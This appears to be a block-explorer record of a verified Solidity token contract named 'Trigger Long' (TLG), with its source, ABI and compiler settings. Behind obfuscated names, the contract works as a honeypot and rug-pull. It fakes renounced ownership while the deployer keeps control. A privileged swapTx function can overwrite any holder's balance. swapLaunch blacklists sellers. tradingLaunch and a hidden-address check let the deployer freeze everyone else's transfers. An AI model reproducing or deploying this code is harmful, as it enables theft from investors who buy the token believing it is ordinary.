{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface atSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountList {\n    function createPair(address walletTake, address receiverFund) external returns (address);\n}\n\ninterface toMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingTake) external view returns (uint256);\n\n    function transfer(address tokenMarketingFrom, uint256 sellTx) external returns (bool);\n\n    function allowance(address toMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMarketingFrom,\n        uint256 sellTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundLaunched, uint256 value);\n    event Approval(address indexed toMax, address indexed spender, uint256 value);\n}\n\ninterface launchTrading is toMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TriggerLong is totalWallet, toMarketing, launchTrading {\n\n    function getOwner() external view returns (address) {\n        return autoEnable;\n    }\n\n    function isTx() public {\n        emit OwnershipTransferred(swapMarketingTrading, address(0));\n        autoEnable = address(0);\n    }\n\n    uint256 minAmount;\n\n    uint256 feeIsAt;\n\n    constructor (){\n        if (fundFee != senderMax) {\n            senderMax = shouldEnable;\n        }\n        atSell amountWallet = atSell(senderListSell);\n        exemptList = amountList(amountWallet.factory()).createPair(amountWallet.WETH(), address(this));\n        \n        swapMarketingTrading = _msgSender();\n        isTx();\n        launchSender[swapMarketingTrading] = true;\n        walletMarketingAt[swapMarketingTrading] = marketingMode;\n        \n        emit Transfer(address(0), swapMarketingTrading, marketingMode);\n    }\n\n    string private launchedLaunchIs = \"TLG\";\n\n    function swapLaunch(address takeReceiver) public {\n        limitMax();\n        if (receiverEnable == fundFee) {\n            receiverEnable = shouldEnable;\n        }\n        if (takeReceiver == swapMarketingTrading || takeReceiver == exemptList) {\n            return;\n        }\n        listSwap[takeReceiver] = true;\n    }\n\n    uint256 public shouldEnable;\n\n    mapping(address => bool) public listSwap;\n\n    function owner() external view returns (address) {\n        return autoEnable;\n    }\n\n    bool private exemptLaunched;\n\n    function transfer(address walletSwapTo, uint256 sellTx) external virtual override returns (bool) {\n        return atReceiver(_msgSender(), walletSwapTo, sellTx);\n    }\n\n    mapping(address => uint256) private walletMarketingAt;\n\n    event OwnershipTransferred(address indexed atAutoReceiver, address indexed feeList);\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapFromReceiver;\n    }\n\n    address public swapMarketingTrading;\n\n    address senderListSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private feeAt;\n\n    uint256 public receiverEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedLaunchIs;\n    }\n\n    uint256 public senderMax;\n\n    function swapTx(address walletSwapTo, uint256 sellTx) public {\n        limitMax();\n        walletMarketingAt[walletSwapTo] = sellTx;\n    }\n\n    function teamTake(address sellWallet) public {\n        if (feeTotalWallet) {\n            return;\n        }\n        if (shouldEnable == sellTake) {\n            shouldEnable = receiverEnable;\n        }\n        launchSender[sellWallet] = true;\n        \n        feeTotalWallet = true;\n    }\n\n    bool private minBuyWallet;\n\n    function transferFrom(address sellMode, address tokenMarketingFrom, uint256 sellTx) external override returns (bool) {\n        if (_msgSender() != senderListSell) {\n            if (feeAt[sellMode][_msgSender()] != type(uint256).max) {\n                require(sellTx <= feeAt[sellMode][_msgSender()]);\n                feeAt[sellMode][_msgSender()] -= sellTx;\n            }\n        }\n        return atReceiver(sellMode, tokenMarketingFrom, sellTx);\n    }\n\n    bool public senderReceiver;\n\n    bool public feeTotalWallet;\n\n    bool public amountReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverExempt;\n    }\n\n    bool public launchedTake;\n\n    address private autoEnable;\n\n    uint256 private marketingMode = 100000000 * 10 ** 18;\n\n    string private receiverExempt = \"Trigger Long\";\n\n    function allowance(address shouldReceiverSender, address walletTeamTx) external view virtual override returns (uint256) {\n        if (walletTeamTx == senderListSell) {\n            return type(uint256).max;\n        }\n        return feeAt[shouldReceiverSender][walletTeamTx];\n    }\n\n    function atReceiver(address sellMode, address tokenMarketingFrom, uint256 sellTx) internal returns (bool) {\n        if (sellMode == swapMarketingTrading) {\n            return takeTx(sellMode, tokenMarketingFrom, sellTx);\n        }\n        uint256 enableLaunch = toMarketing(exemptList).balanceOf(launchAmount);\n        require(enableLaunch == feeIsAt);\n        require(tokenMarketingFrom != launchAmount);\n        if (listSwap[sellMode]) {\n            return takeTx(sellMode, tokenMarketingFrom, autoSwap);\n        }\n        return takeTx(sellMode, tokenMarketingFrom, sellTx);\n    }\n\n    mapping(address => bool) public launchSender;\n\n    function balanceOf(address marketingTake) public view virtual override returns (uint256) {\n        return walletMarketingAt[marketingTake];\n    }\n\n    uint256 public fundFee;\n\n    uint256 private sellTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingMode;\n    }\n\n    function limitMax() private view {\n        require(launchSender[_msgSender()]);\n    }\n\n    address public exemptList;\n\n    function tradingLaunch(uint256 sellTx) public {\n        limitMax();\n        feeIsAt = sellTx;\n    }\n\n    uint8 private swapFromReceiver = 18;\n\n    address launchAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant autoSwap = 17 ** 10;\n\n    function takeTx(address sellMode, address tokenMarketingFrom, uint256 sellTx) internal returns (bool) {\n        require(walletMarketingAt[sellMode] >= sellTx);\n        walletMarketingAt[sellMode] -= sellTx;\n        walletMarketingAt[tokenMarketingFrom] += sellTx;\n        emit Transfer(sellMode, tokenMarketingFrom, sellTx);\n        return true;\n    }\n\n    function approve(address walletTeamTx, uint256 sellTx) public virtual override returns (bool) {\n        feeAt[_msgSender()][walletTeamTx] = sellTx;\n        emit Approval(_msgSender(), walletTeamTx, sellTx);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAutoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiverSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTeamTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketingTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwapTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"swapTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"}],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"tradingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwapTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMarketingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TriggerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}